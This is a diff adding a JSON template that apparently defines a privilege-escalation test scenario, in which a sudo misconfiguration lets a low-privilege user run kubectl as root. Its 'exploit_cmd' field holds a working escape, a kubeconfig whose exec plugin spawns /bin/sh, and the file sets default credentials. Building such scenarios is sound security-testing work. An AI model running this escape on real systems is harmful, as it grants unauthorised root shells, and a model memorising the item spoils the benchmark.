@@ -1,0 +1,31 @@
+{
+  "template_id": "auto_T1548_003_sudo_kubectl",
+  "category": "A2_sudo",
+  "attack_technique": "T1548.003",
+  "cwe": "CWE-269",
+  "description": "sudo misconfiguration allows running /usr/bin/kubectl as root, enabling shell",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "dedup_group": "sudo_shell_escape",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "T1548_003_sudo_kubectl",
+      "type": "core",
+      "difficulty": "easy"
+    }
+  ],
+  "exploit_cmd": "cat >/path/to/temp-file <<EOF\nclusters:\n- cluster:\n    server: https://x\n  name: x\ncontexts:\n- context:\n    cluster: x\n    user: x\n  name: x\ncurrent-context: x\nusers:\n- name: x\n  user:\n    exec:\n      apiVersion: client.authentication.k8s.io/v1\n      interactiveMode: Always\n      command: /bin/sh\n      args:\n        - '-c'\n        - '/bin/sh 0<&2 1>&2'\nEOF\n\nkubectl get pods --kubeconfig=/path/to/temp-file",
+  "binary_path": "/usr/bin/kubectl"
+}
